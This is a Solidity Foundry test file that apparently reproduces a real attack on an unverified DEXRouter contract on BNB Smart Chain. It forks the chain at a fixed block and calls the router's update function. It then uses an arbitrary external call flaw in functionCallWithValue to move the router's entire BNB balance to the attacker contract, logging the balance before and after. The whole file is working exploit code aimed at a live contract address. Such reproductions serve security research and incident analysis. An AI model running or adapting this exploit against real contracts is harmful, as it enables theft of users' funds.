// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {
    // Victim unverified contract. Name "DEXRouter" taken from parameter name in "go" function in attack contract
    IDEXRouter private constant DEXRouter =
        IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);

    function setUp() public {
        vm.createSelectFork("bsc", 32161325);
        vm.label(address(DEXRouter), "DEXRouter");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint(
            "Attacker BNB balance before exploit",
            address(this).balance,
            18
        );
        // DEXRouter will call back to function with selector "0xe44a73b7". Look at fallback function
        DEXRouter.update(
            address(this),
            address(this),
            address(this),
            address(this)
        );

        // Arbitrary external call vulnerability here. DEXRouter will call back "a" payable function and next transfer BNB to this contract
        DEXRouter.functionCallWithValue(
            address(this),
            abi.encodePacked(this.a.selector),
            address(DEXRouter).balance
        );

        emit log_named_decimal_uint(
            "Attacker BNB balance after exploit",
            address(this).balance,
            18
        );
    }

    function a() external payable returns (bool) {
        return true;
    }

    fallback(bytes calldata) external payable returns (bytes memory) {
        return abi.encode(true);
    }
}